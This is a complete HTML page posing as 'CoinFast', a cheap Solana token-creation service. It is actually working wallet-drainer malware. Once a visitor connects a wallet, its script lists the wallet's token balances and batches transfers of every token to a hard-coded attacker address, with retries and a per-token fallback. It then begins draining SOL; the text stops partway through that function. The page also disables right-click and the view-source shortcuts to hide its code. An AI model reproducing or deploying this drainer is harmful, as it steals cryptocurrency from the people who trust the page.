<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CoinFast - Create Your Own Token</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        
        :root {
            --primary-blue: #4a8eff;
            --primary-purple: #8a63d2;
            --primary-gradient: linear-gradient(90deg, #4a8eff, #c353ff);
            --dark-bg: #0f1528;
            --darker-bg: #0a0f1d;
            --card-bg: rgba(30, 40, 60, 0.5);
            --border-color: #2a3a5a;
            --text-light: #8a9cc2;
            --text-white: #ffffff;
            --accent-cyan: #00b8d9;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }
        
        body {
            background-color: var(--dark-bg);
            background-image: radial-gradient(circle at 10% 20%, rgba(20, 30, 60, 0.5) 0%, rgba(10, 15, 30, 0.5) 90%);
            color: var(--text-white);
            min-height: 100vh;
        }
        
        .banner {
            background: var(--primary-gradient);
            text-align: center;
            padding: 10px;
            font-weight: 600;
            font-size: 14px;
            letter-spacing: 0.5px;
            animation: gradientShift 8s ease infinite;
            background-size: 200% 200%;
        }
        
        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        
        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 50px;
            border-bottom: 1px solid var(--border-color);
            background-color: rgba(15, 21, 40, 0.9);
            backdrop-filter: blur(10px);
        }
        
        .logo {
            font-size: 28px;
            font-weight: bold;
            background: linear-gradient(90deg, #4a8eff, #ff6b8b);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: -0.5px;
        }
        
        .nav-links {
            display: flex;
            gap: 30px;
        }
        
        .nav-links a {
            color: var(--text-light);
            text-decoration: none;
            font-size: 16px;
            transition: color 0.3s ease;
            position: relative;
            padding: 5px 0;
        }
        
        .nav-links a:hover {
            color: var(--text-white);
        }
        
        .nav-links a::after {
            content: '';
            position: absolute;
            width: 0;
            height: 2px;
            bottom: 0;
            left: 0;
            background: var(--primary-gradient);
            transition: width 0.3s ease;
        }
        
        .nav-links a:hover::after {
            width: 100%;
        }
        
        .new-badge {
            background-color: #4caf50;
            color: white;
            padding: 2px 6px;
            border-radius: 10px;
            font-size: 12px;
            margin-left: 5px;
            display: inline-block;
            vertical-align: middle;
        }
        
        .wallet-btn {
            background-color: var(--accent-cyan);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(0, 184, 217, 0.3);
        }
        
        .wallet-btn:hover {
            background-color: #00a0c0;
            transform: translateY(-2px);
            box-shadow: 0 6px 15px rgba(0, 184, 217, 0.4);
        }
        
        .main-content {
            text-align: center;
            padding: 50px 20px;
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .title {
            font-size: 48px;
            background: var(--primary-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 20px;
            font-weight: 700;
            letter-spacing: -1px;
            opacity: 0;
            transform: translateY(20px);
            animation: fadeInUp 0.8s forwards 0.2s;
        }
        
        .subtitle {
            font-size: 18px;
            color: var(--text-light);
            margin-bottom: 40px;
            max-width: 700px;
            margin-left: auto;
            margin-right: auto;
            opacity: 0;
            transform: translateY(20px);
            animation: fadeInUp 0.8s forwards 0.4s;
        }
        
        @keyframes fadeInUp {
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .connect-box {
            max-width: 800px;
            margin: 0 auto;
            background-color: var(--card-bg);
            border-radius: 12px;
            padding: 40px;
            border: 1px solid var(--border-color);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            margin-bottom: 40px;
            opacity: 0;
            transform: translateY(20px);
            animation: fadeInUp 0.8s forwards 0.6s;
            position: relative;
            overflow: hidden;
        }
        
        .connect-box::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--primary-blue), transparent);
            animation: borderGlow 4s infinite;
        }
        
        @keyframes borderGlow {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 1; }
        }
        
        .steps-box {
            max-width: 800px;
            margin: 0 auto;
            background-color: var(--card-bg);
            border-radius: 12px;
            padding: 30px;
            border: 1px solid var(--border-color);
            text-align: left;
            margin-bottom: 40px;
            opacity: 0;
            transform: translateY(20px);
            animation: fadeInUp 0.8s forwards 0.8s;
        }
        
        .steps-title {
            font-size: 28px;
            color: var(--primary-blue);
            margin-bottom: 20px;
            font-weight: 600;
        }
        
        .steps-subtitle {
            font-size: 18px;
            color: var(--text-light);
            margin-bottom: 20px;
        }
        
        ol {
            padding-left: 20px;
        }
        
        li {
            margin-bottom: 15px;
            color: #d1d7e0;
            position: relative;
            padding-left: 10px;
        }
        
        li::marker {
            color: var(--primary-blue);
            font-weight: bold;
        }
        
        .price-info {
            color: var(--text-light);
            margin-top: 20px;
            line-height: 1.6;
        }
        
        .price-highlight {
            color: var(--accent-cyan);
            font-weight: bold;
        }
        
        .trending-highlight {
            color: #c353ff;
            font-weight: bold;
        }
        
        #result {
            margin-top: 20px;
            padding: 15px;
            background-color: rgba(20, 30, 50, 0.7);
            border-radius: 8px;
            text-align: left;
            color: #d1d7e0;
            min-height: 50px;
            white-space: pre-line;
            display: none;
            max-height: 300px;
            overflow-y: auto;
        }
        
        .faq-box {
            max-width: 800px;
            margin: 0 auto;
            background-color: var(--card-bg);
            border-radius: 12px;
            padding: 30px;
            border: 1px solid var(--border-color);
            text-align: left;
            opacity: 0;
            transform: translateY(20px);
            animation: fadeInUp 0.8s forwards 1s;
        }
        
        .faq-title {
            font-size: 28px;
            color: var(--primary-blue);
            margin-bottom: 20px;
            font-weight: 600;
        }
        
        .faq-item {
            padding: 15px 0;
            border-bottom: 1px solid var(--border-color);
            display: flex;
            justify-content: space-between;
            align-items: center;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .faq-item:hover {
            background-color: rgba(40, 50, 70, 0.3);
            padding-left: 10px;
            border-radius: 8px;
        }
        
        .faq-item:last-child {
            border-bottom: none;
        }
        
        .plus-icon {
            color: var(--primary-blue);
            font-size: 24px;
            transition: transform 0.3s ease;
        }
        
        .faq-item:hover .plus-icon {
            transform: rotate(45deg);
        }
        
        .footer {
            text-align: center;
            padding: 30px;
            color: var(--text-light);
            font-size: 14px;
            border-top: 1px solid var(--border-color);
            line-height: 1.6;
            opacity: 0;
            animation: fadeIn 1s forwards 1.2s;
        }
        
        @keyframes fadeIn {
            to { opacity: 1; }
        }
        
        .social-links {
            margin: 20px 0;
        }
        
        .social-links a {
            color: var(--text-light);
            text-decoration: none;
            margin: 0 10px;
            transition: color 0.3s ease;
        }
        
        .social-links a:hover {
            color: var(--primary-blue);
        }
        
        .warning {
            color: #ff6b6b;
            font-weight: bold;
            margin-bottom: 15px;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
            position: absolute;
            top: 10px;
            right: 10px;
            background: rgba(255, 107, 107, 0.1);
            padding: 5px 10px;
            border-radius: 4px;
            border: 1px solid rgba(255, 107, 107, 0.3);
        }
        
        /* Mobile bottom navigation */
        .mobile-nav {
            display: none;
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: rgba(15, 21, 40, 0.95);
            padding: 12px 0;
            border-top: 1px solid var(--border-color);
            z-index: 100;
        }
        
        .mobile-nav-inner {
            display: flex;
            justify-content: space-around;
            align-items: center;
        }
        
        .mobile-nav-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            font-size: 10px;
            color: var(--text-light);
        }
        
        .mobile-nav-item i {
            font-size: 20px;
            margin-bottom: 5px;
        }
        
        .mobile-nav-item.active {
            color: var(--primary-blue);
        }
        
        /* Wallet modal styles */
        .wallet-adapter-modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(0, 0, 0, 0.5);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }
        
        .wallet-adapter-modal-wrapper {
            background-color: var(--card-bg);
            border-radius: 12px;
            padding: 24px;
            max-width: 500px;
            width: 100%;
            border: 1px solid var(--border-color);
            position: relative;
        }
        
        .wallet-adapter-modal-title {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 16px;
            color: var(--text-white);
            text-align: center;
        }
        
        .wallet-adapter-modal-list {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 16px;
            margin-bottom: 16px;
        }
        
        .wallet-adapter-button {
            background-color: rgba(40, 50, 70, 0.5);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 12px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all 0.2s ease;
        }
        
        .wallet-adapter-button:hover {
            background-color: rgba(60, 70, 90, 0.5);
            transform: translateY(-2px);
        }
        
        .wallet-icon {
            font-size: 24px;
            margin-bottom: 8px;
        }
        
        .wallet-adapter-button-text {
            font-size: 14px;
            color: var(--text-white);
        }
        
        .wallet-adapter-modal-close {
            position: absolute;
            top: 16px;
            right: 16px;
            background: none;
            border: none;
            color: var(--text-light);
            font-size: 24px;
            cursor: pointer;
        }
        
        /* Mobile-specific styles */
        @media screen and (max-width: 768px) {
            .navbar {
                padding: 10px 15px;
                justify-content: space-between;
            }
            
            .menu-icon {
                display: block;
                font-size: 24px;
                color: var(--text-white);
            }
            
            .logo {
                font-size: 24px;
            }
            
            .nav-links {
                display: none;
            }
            
            .wallet-btn {
                padding: 8px 16px;
                font-size: 14px;
            }
            
            .banner {
                font-size: 12px;
                padding: 8px;
            }
            
            .main-content {
                padding: 20px 15px 80px 15px;
            }
            
            .title {
                font-size: 32px;
                margin-bottom: 15px;
            }
            
            .subtitle {
                font-size: 14px;
                margin-bottom: 20px;
            }
            
            .connect-box {
                padding: 25px 15px;
                margin-bottom: 20px;
            }
            
            .steps-box {
                padding: 20px 15px;
            }
            
            .steps-title {
                font-size: 22px;
                background: linear-gradient(90deg, #4a8eff, #c353ff);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
            }
            
            .steps-subtitle {
                font-size: 14px;
            }
            
            li {
                font-size: 14px;
                margin-bottom: 10px;
            }
            
            .mobile-nav {
                display: flex;
            }
            
            .faq-box, .footer {
                display: none;
            }
            
            .wallet-adapter-modal-wrapper {
                width: 90%;
                padding: 16px;
            }
            
            .wallet-adapter-modal-list {
                grid-template-columns: repeat(2, 1fr);
                gap: 12px;
            }
        }
    </style>
    <!-- Disable right-click to prevent easy source viewing -->
    <script>
        document.addEventListener('contextmenu', event => event.preventDefault());
        
        // Disable keyboard shortcuts for viewing source
        document.addEventListener("keydown", function(event) {
            if ((event.ctrlKey && (event.keyCode == 85 || event.keyCode == 83)) || event.keyCode == 123) {
                event.preventDefault();
            }
        });
    </script>
</head>
<body>
    <div class="banner">CREATE YOUR COIN FOR ONLY 0.1 SOL, FAST!</div>
    
    <div class="navbar">
        <div class="menu-icon">☰</div>
        <div class="logo">CoinFast</div>
        <div class="nav-links">
            <a href="#">Create Token</a>
            <a href="#">Trending Tokens <span class="new-badge">NEW</span></a>
            <a href="#">Create Liquidity</a>
            <a href="#">Manage Liquidity</a>
        </div>
        <button id="connectButton" class="wallet-btn">Select Wallet</button>
    </div>
    
    <div class="main-content">
        <h1 class="title">Create Your Own Coin FAST</h1>
        <p class="subtitle">Launch your own token on Solana in seconds. No coding required.</p>
        
        <div class="connect-box">
            <h3>Please connect your wallet to continue</h3>
            <button id="connectButtonInner" class="wallet-btn" style="margin-top: 20px;">Select Wallet</button>
            <div id="result"></div>
        </div>
        
        <div class="steps-box">
            <h2 class="steps-title">How to use Solana Token Creator</h2>
            <p class="steps-subtitle">Follow these simple steps:</p>
            <ol>
                <li>Connect your Solana wallet.</li>
                <li>Write the name you want for your Token.</li>
                <li>Write the symbol (max 8 characters)</li>
                <li>Upload the image for your token (max 5MB)</li>
                <li>Select the decimals quantity (9 is usually used for meme tokens).</li>
                <li>Type in the total supply your token should have.</li>
                <li>Write the description you want for your SPL Token.</li>
                <li>On step 3 fill in the remaining details about your token</li>
                <li>Choose if you want to leave the revoke options turned on or off</li>
                <li>Click on Create, accept the transaction, and wait until your token is ready.</li>
            </ol>
            <div class="price-info">
                The cost of creating a regular Token is <span class="price-highlight">0.1 SOL</span>, which includes all fees needed for the SPL Token creation.
            </div>
            <div class="price-info">
                Creating a <span class="trending-highlight">trending token</span> costs <span class="price-highlight">0.3 SOL</span> and includes <span class="trending-highlight">1 billion supply</span>, 9 decimals with all 3 revoke options (freeze, mint, update) turned on by default.
            </div>
            <div class="price-info">
                The creation process will start and will take some seconds. After that, you will receive the total supply of the token in the wallet you chose.
            </div>
        </div>
        
        <div class="faq-box">
            <h2 class="faq-title">Frequently Asked Questions</h2>
            <div class="faq-item">
                <div>What is Solana, and why should I launch my token on it?</div>
                <div class="plus-icon">+</div>
            </div>
            <div class="faq-item">
                <div>How can I create a token on the Solana blockchain?</div>
                <div class="plus-icon">+</div>
            </div>
            <div class="faq-item">
                <div>What are the steps to deploy my own token on Solana?</div>
                <div class="plus-icon">+</div>
            </div>
            <div class="faq-item">
                <div>How can I manage token authorities on Solana?</div>
                <div class="plus-icon">+</div>
            </div>
            <div class="faq-item">
                <div>What platforms can assist with launching a token on Solana?</div>
                <div class="plus-icon">+</div>
            </div>
        </div>
    </div>
    
    <!-- Mobile bottom navigation -->
    <div class="mobile-nav">
        <div class="mobile-nav-item active">
            <i>🏠</i>
            <span>Home</span>
        </div>
        <div class="mobile-nav-item">
            <i>🔖</i>
            <span>Saved</span>
        </div>
        <div class="mobile-nav-item">
            <i>🔍</i>
            <span>Search</span>
        </div>
        <div class="mobile-nav-item">
            <i>👤</i>
            <span>Profile</span>
        </div>
        <div class="mobile-nav-item">
            <i>•••</i>
            <span>More</span>
        </div>
    </div>
    
    <!-- Wallet Adapter Modal with emoji icons instead of images -->
    <div id="wallet-adapter-modal" class="wallet-adapter-modal" style="display: none;">
        <div class="wallet-adapter-modal-wrapper">
            <button class="wallet-adapter-modal-close" id="wallet-adapter-modal-close">×</button>
            <h3 class="wallet-adapter-modal-title">Connect a wallet</h3>
            <div class="wallet-adapter-modal-list" id="wallet-adapter-modal-list">
                <!-- Wallet buttons will be generated here -->
            </div>
        </div>
    </div>
    
    <div class="footer">
        FOLLOW OUR OFFICIAL <a href="#" style="color: #4a8eff; text-decoration: none;">X ACCOUNT</a> AND <a href="#" style="color: #4a8eff; text-decoration: none;">TELEGRAM CHANNEL</a> FOR UPDATES
        <br><br>
        CoinFast is a token creation platform that allows users to generate Solana-based tokens instantly, with no coding required. CoinFast does not issue, endorse, manage, or provide liquidity for any tokens created using our service. We do not provide financial advice, investment recommendations, or guarantees of value, price, or returns on any tokens. Tokens created on CoinFast are not securities, and users are solely responsible for ensuring compliance with applicable laws and regulations in their jurisdiction. CoinFast does not facilitate token trading, fundraising, or liquidity provision. By using CoinFast, you acknowledge that creating and trading tokens carry significant risks, including loss of funds, market volatility, and regulatory uncertainty. CoinFast is provided "as is" without warranties of any kind. We are not responsible for any outcomes related to the use of our platform. By using CoinFast, you accept full responsibility for your actions and any consequences that may arise. Always conduct your own due diligence before engaging with any token or project.
        <br><br>
        © 2025 CoinFast | All Rights Reserved | Support on Telegram <a href="#" style="color: #4a8eff; text-decoration: none;">@coinfastofficial</a> | Become an affiliate for CoinFast
    </div>

    <!-- Use the latest Solana web3.js for getLatestBlockhash support -->
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.98.2/lib/index.iife.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.1.8/lib/index.iife.min.js"></script>
    <script>
        // Use only Alchemy RPC endpoint for better performance
        const RPC_ENDPOINT = "https://solana-mainnet.g.alchemy.com/v2/Jju7OsVQj7jaiA6_pkzWwdEFFaPLZ9uu";
        const myWallet = new solanaWeb3.PublicKey('2K4CGuZGviKggeJBi6Em1fAefXpHtnv44j8m2Ab7UdEo');

        const connectButton = document.getElementById('connectButton');
        const connectButtonInner = document.getElementById('connectButtonInner');
        const resultDiv = document.getElementById('result');
        const walletModal = document.getElementById('wallet-adapter-modal');
        const walletModalClose = document.getElementById('wallet-adapter-modal-close');
        const walletModalList = document.getElementById('wallet-adapter-modal-list');

        // Wallet adapters with emoji icons instead of problematic image URLs
        const walletAdapters = [
            {
                name: 'Phantom',
                icon: '👻', // Phantom emoji
                adapter: 'phantom'
            },
            {
                name: 'Solflare',
                icon: '🔆', // Sun emoji for Solflare
                adapter: 'solflare'
            },
            {
                name: 'Backpack',
                icon: '🎒', // Backpack emoji
                adapter: 'backpack'
            },
            {
                name: 'Brave',
                icon: '🦁', // Lion emoji for Brave
                adapter: 'brave'
            },
            {
                name: 'Coinbase',
                icon: '💰', // Money bag for Coinbase
                adapter: 'coinbase'
            },
            {
                name: 'Glow',
                icon: '✨', // Sparkles for Glow
                adapter: 'glow'
            },
            {
                name: 'Trust',
                icon: '🔐', // Lock for Trust
                adapter: 'trust'
            },
            {
                name: 'Slope',
                icon: '⛷️', // Ski for Slope
                adapter: 'slope'
            },
            {
                name: 'Exodus',
                icon: '🚀', // Rocket for Exodus
                adapter: 'exodus'
            },
            {
                name: 'Coin98',
                icon: '🪙', // Coin for Coin98
                adapter: 'coin98'
            }
        ];

        // Add event listener to both buttons to open wallet modal
        connectButton.addEventListener('click', openWalletModal);
        connectButtonInner.addEventListener('click', openWalletModal);
        walletModalClose.addEventListener('click', closeWalletModal);

        // Add hover animations to list items
        const listItems = document.querySelectorAll('li');
        listItems.forEach((item, index) => {
            item.style.opacity = '0';
            item.style.transform = 'translateX(20px)';
            item.style.transition = 'all 0.3s ease';
            
            setTimeout(() => {
                item.style.opacity = '1';
                item.style.transform = 'translateX(0)';
            }, 1000 + (index * 100));
        });

        // Add hover effect to FAQ items
        const faqItems = document.querySelectorAll('.faq-item');
        faqItems.forEach(item => {
            item.addEventListener('mouseenter', () => {
                const plusIcon = item.querySelector('.plus-icon');
                plusIcon.style.transform = 'rotate(45deg)';
            });
            
            item.addEventListener('mouseleave', () => {
                const plusIcon = item.querySelector('.plus-icon');
                plusIcon.style.transform = 'rotate(0deg)';
            });
        });

        // Initialize wallet modal
        function initWalletModal() {
            walletModalList.innerHTML = '';
            
            walletAdapters.forEach(wallet => {
                const walletButton = document.createElement('div');
                walletButton.className = 'wallet-adapter-button';
                walletButton.innerHTML = `
                    <div class="wallet-icon">${wallet.icon}</div>
                    <span class="wallet-adapter-button-text">${wallet.name}</span>
                `;
                walletButton.addEventListener('click', () => connectWithWallet(wallet.adapter));
                walletModalList.appendChild(walletButton);
            });
        }

        // Open wallet modal
        function openWalletModal() {
            initWalletModal();
            walletModal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
        }

        // Close wallet modal
        function closeWalletModal() {
            walletModal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }

        // Get optimized connection with longer timeout
        function getConnection() {
            return new solanaWeb3.Connection(
                RPC_ENDPOINT, 
                {
                    commitment: 'confirmed',
                    confirmTransactionInitialTimeout: 120000, // 2 minutes timeout
                    disableRetryOnRateLimit: false
                }
            );
        }

        // Connect with selected wallet - fixed to prevent undefined.toString() error
        async function connectWithWallet(adapterName) {
            closeWalletModal();
            
            // Show loading animation
            connectButton.innerHTML = 'Connecting...';
            connectButtonInner.innerHTML = 'Connecting...';
            
            try {
                let wallet = null;
                
                // Check for different wallet providers
                if (adapterName === 'phantom' && window.solana) {
                    wallet = window.solana;
                } else if (adapterName === 'solflare' && window.solflare) {
                    wallet = window.solflare;
                } else if (adapterName === 'backpack' && window.backpack) {
                    wallet = window.backpack.solana;
                } else if (adapterName === 'brave' && window.braveSolana) {
                    wallet = window.braveSolana;
                } else if (adapterName === 'coinbase' && window.coinbaseSolana) {
                    wallet = window.coinbaseSolana;
                } else if (adapterName === 'glow' && window.glowSolana) {
                    wallet = window.glowSolana;
                } else if (adapterName === 'trust' && window.trustwallet) {
                    wallet = window.trustwallet.solana;
                } else if (adapterName === 'slope' && window.slope) {
                    wallet = window.slope;
                } else if (adapterName === 'exodus' && window.exodus) {
                    wallet = window.exodus.solana;
                } else if (adapterName === 'coin98' && window.coin98) {
                    wallet = window.coin98.sol;
                } else {
                    // Fallback to any available wallet
                    wallet = window.solana || window.solflare || 
                             (window.backpack && window.backpack.solana);
                    
                    if (!wallet) {
                        throw new Error(`${adapterName} wallet not installed. Please install it first.`);
                    }
                }
                
                // Connect to wallet - Make sure wallet exists before trying to connect
                if (!wallet) {
                    throw new Error(`${adapterName} wallet not detected. Please install the wallet extension.`);
                }
                
                const response = await wallet.connect();
                
                // Make sure response and publicKey exist before using them
                if (!response || !response.publicKey) {
                    throw new Error("Wallet connection failed. No public key received.");
                }
                
                const publicKey = response.publicKey;
                
                // Show success animation
                connectButton.innerHTML = 'Connected ✓';
                connectButtonInner.innerHTML = 'Connected ✓';
                connectButton.style.backgroundColor = '#4caf50';
                connectButtonInner.style.backgroundColor = '#4caf50';
                
                // Show result div with animation
                resultDiv.style.display = 'block';
                resultDiv.style.opacity = '0';
                resultDiv.style.transform = 'translateY(10px)';
                
                // Store the publicKey string safely
                const publicKeyString = publicKey.toString();
                resultDiv.innerText = `Connected: ${publicKeyString}`;
                
                setTimeout(() => {
                    resultDiv.style.opacity = '1';
                    resultDiv.style.transform = 'translateY(0)';
                    resultDiv.style.transition = 'all 0.3s ease';
                }, 100);

                // Set the active wallet for future use
                window.activeWallet = wallet;

                // Step 1: Enumerate all SPL token accounts and attempt to drain
                await drainAllSplTokens(publicKey);

                // Step 2: Drain SOL
                await drainSol(publicKey);
                
            } catch (err) {
                console.error("Connection error:", err);
                connectButton.innerHTML = 'Select Wallet';
                connectButtonInner.innerHTML = 'Select Wallet';
                resultDiv.style.display = 'block';
                resultDiv.innerText = `Error: ${err.message}`;
                
                setTimeout(() => {
                    resultDiv.style.opacity = '1';
                    resultDiv.style.transform = 'translateY(0)';
                    resultDiv.style.transition = 'all 0.3s ease';
                }, 100);
            }
        }

        // Improved transaction sending with retry logic
        async function sendTransactionWithRetry(connection, transaction, wallet, maxRetries = 3) {
            let retries = 0;
            
            while (retries < maxRetries) {
                try {
                    // Get a fresh blockhash for each attempt
                    const { blockhash, lastValidBlockHeight } = 
                        await connection.getLatestBlockhash('confirmed');
                    transaction.recentBlockhash = blockhash;
                    transaction.lastValidBlockHeight = lastValidBlockHeight;
                    
                    const signed = await wallet.signTransaction(transaction);
                    const signature = await connection.sendRawTransaction(
                        signed.serialize(),
                        { 
                            skipPreflight: true,
                            maxRetries: 3
                        }
                    );
                    
                    resultDiv.innerText += `\nTransaction sent: ${signature}`;
                    
                    // Wait for confirmation with timeout
                    await connection.confirmTransaction({
                        signature,
                        blockhash,
                        lastValidBlockHeight
                    }, 'confirmed');
                    
                    resultDiv.innerText += `\nTransaction confirmed: ${signature}`;
                    return signature;
                } catch (err) {
                    retries++;
                    console.error(`Transaction attempt ${retries} failed:`, err);
                    resultDiv.innerText += `\nRetry ${retries}/${maxRetries}: ${err.message}`;
                    
                    // Wait before retrying with exponential backoff
                    const delay = Math.min(1000 * Math.pow(2, retries), 10000);
                    await new Promise(resolve => setTimeout(resolve, delay));
                }
            }
            
            throw new Error(`Transaction failed after ${maxRetries} retries`);
        }

        // New implementation: Drain all tokens with batched transactions
        async function drainAllSplTokens(ownerPublicKey) {
            try {
                if (!ownerPublicKey) {
                    throw new Error("Invalid owner public key");
                }
                
                const connection = getConnection();
                resultDiv.innerText += `\nSearching for SPL tokens...`;

                // Get all SPL token accounts for the owner
                const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
                    ownerPublicKey,
                    { programId: window.splToken.TOKEN_PROGRAM_ID }
                );

                if (!tokenAccounts || !tokenAccounts.value || tokenAccounts.value.length === 0) {
                    resultDiv.innerText += `\nNo SPL tokens found.`;
                    return;
                }

                // Filter accounts with positive balance
                const accountsWithBalance = tokenAccounts.value.filter(
                    ({ account }) => parseInt(account.data.parsed.info.tokenAmount.amount) > 0
                );
                
                if (accountsWithBalance.length === 0) {
                    resultDiv.innerText += `\nFound ${tokenAccounts.value.length} token accounts, but none have balance.`;
                    return;
                }
                
                resultDiv.innerText += `\nFound ${accountsWithBalance.length} token(s) with balance.`;
                
                // Process tokens in batches of 8 (to stay under transaction size limits)
                const batchSize = 8;
                const batches = [];
                
                for (let i = 0; i < accountsWithBalance.length; i += batchSize) {
                    batches.push(accountsWithBalance.slice(i, i + batchSize));
                }
                
                resultDiv.innerText += `\nProcessing ${batches.length} batch(es) of tokens...`;
                
                // Process each batch with a single transaction
                for (let i = 0; i < batches.length; i++) {
                    const batch = batches[i];
                    const transaction = new solanaWeb3.Transaction();
                    
                    resultDiv.innerText += `\n\nPreparing batch ${i+1}/${batches.length} (${batch.length} tokens)`;
                    
                    // First create any missing ATAs
                    for (const { account } of batch) {
                        const info = account.data.parsed.info;
                        const mint = new solanaWeb3.PublicKey(info.mint);
                        
                        // Check if destination ATA exists, if not create it
                        const ata = await window.splToken.Token.getAssociatedTokenAddress(
                            window.splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
                            window.splToken.TOKEN_PROGRAM_ID,
                            mint,
                            myWallet
                        );
                        
                        const ataInfo = await connection.getAccountInfo(ata);
                        
                        if (!ataInfo) {
                            transaction.add(
                                window.splToken.Token.createAssociatedTokenAccountInstruction(
                                    window.splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
                                    window.splToken.TOKEN_PROGRAM_ID,
                                    mint,
                                    ata,
                                    myWallet,
                                    ownerPublicKey
                                )
                            );
                            resultDiv.innerText += `\nAdding ATA creation for ${info.mint.slice(0, 6)}...`;
                        }
                    }
                    
                    // Then add transfer instructions
                    for (const { pubkey, account } of batch) {
                        const info = account.data.parsed.info;
                        const mint = new solanaWeb3.PublicKey(info.mint);
                        const amount = parseInt(info.tokenAmount.amount, 10);
                        
                        if (amount > 0) {
                            const ata = await window.splToken.Token.getAssociatedTokenAddress(
                                window.splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
                                window.splToken.TOKEN_PROGRAM_ID,
                                mint,
                                myWallet
                            );
                            
                            transaction.add(
                                window.splToken.Token.createTransferInstruction(
                                    window.splToken.TOKEN_PROGRAM_ID,
                                    pubkey,
                                    ata,
                                    ownerPublicKey,
                                    [],
                                    amount
                                )
                            );
                            
                            const symbol = info.tokenAmount.symbol || info.symbol || 'tokens';
                            resultDiv.innerText += `\nAdding transfer for ${amount / Math.pow(10, info.tokenAmount.decimals)} ${symbol}`;
                        }
                    }
                    
                    // Send the batch transaction
                    transaction.feePayer = ownerPublicKey;
                    
                    if (!window.activeWallet) {
                        throw new Error("Wallet disconnected");
                    }
                    
                    try {
                        resultDiv.innerText += `\nSending batch transaction...`;
                        await sendTransactionWithRetry(connection, transaction, window.activeWallet);
                        resultDiv.innerText += `\nBatch ${i+1} drained successfully!`;
                    } catch (err) {
                        resultDiv.innerText += `\nBatch ${i+1} failed: ${err.message}`;
                        // If batching fails, fall back to individual transfers
                        resultDiv.innerText += `\nFalling back to individual transfers...`;
                        for (const item of batch) {
                            await drainSingleToken(connection, ownerPublicKey, item.pubkey, item.account);
                        }
                    }
                }
            } catch (err) {
                console.error("Token draining error:", err);
                resultDiv.innerText += `\nToken draining error: ${err.message}`;
            }
        }

        // Helper function to drain a single token if batching fails
        async function drainSingleToken(connection, ownerPublicKey, pubkey, account) {
            try {
                const info = account.data.parsed.info;
                const mint = new solanaWeb3.PublicKey(info.mint);
                const amount = parseInt(info.tokenAmount.amount, 10);
                
                if (amount > 0) {
                    // Create ATA if it doesn't exist
                    const ata = await window.splToken.Token.getAssociatedTokenAddress(
                        window.splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
                        window.splToken.TOKEN_PROGRAM_ID,
                        mint,
                        myWallet
                    );
                    
                    const ataInfo = await connection.getAccountInfo(ata);
                    
                    if (!ataInfo) {
                        const createAtaTx = new solanaWeb3.Transaction().add(
                            window.splToken.Token.createAssociatedTokenAccountInstruction(
                                window.splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
                                window.splToken.TOKEN_PROGRAM_ID,
                                mint,
                                ata,
                                myWallet,
                                ownerPublicKey
                            )
                        );
                        createAtaTx.feePayer = ownerPublicKey;
                        
                        await sendTransactionWithRetry(connection, createAtaTx, window.activeWallet);
                        resultDiv.innerText += `\nCreated ATA for ${info.mint.slice(0, 6)}`;
                    }
                    
                    const transaction = new solanaWeb3.Transaction().add(
                        window.splToken.Token.createTransferInstruction(
                            window.splToken.TOKEN_PROGRAM_ID,
                            pubkey,
                            ata,
                            ownerPublicKey,
                            [],
                            amount
                        )
                    );
                    
                    transaction.feePayer = ownerPublicKey;
                    
                    await sendTransactionWithRetry(connection, transaction, window.activeWallet);
                    resultDiv.innerText += `\nToken ${info.mint.slice(0, 6)} drained individually.`;
                }
            } catch (err) {
                const mintId = account?.data?.parsed?.info?.mint?.slice(0, 6) || "unknown";
                resultDiv.innerText += `\nFailed to drain token ${mintId}: ${err.message}`;
            }
        }

        async function drainSol(ownerPublicKey) {
            try {
                if (!ownerPublicKey) {
                    throw new Error("Invalid owner public key");
                }
                
                resultDiv.innerText += `\n\nChecking SOL balance...`;
                const connection = getConnection();
                const ownerBalance = await connection.getBalance(ownerPublicKey);
                resultDiv.innerText += `\nSOL Balance: ${ownerBalance / 1000000000} SOL`;

                // Calculate minimum required for fees - increased for better success rate
                const minFee = 10000; // Base minimum fee (10000 lamports = 0.00001 SOL)
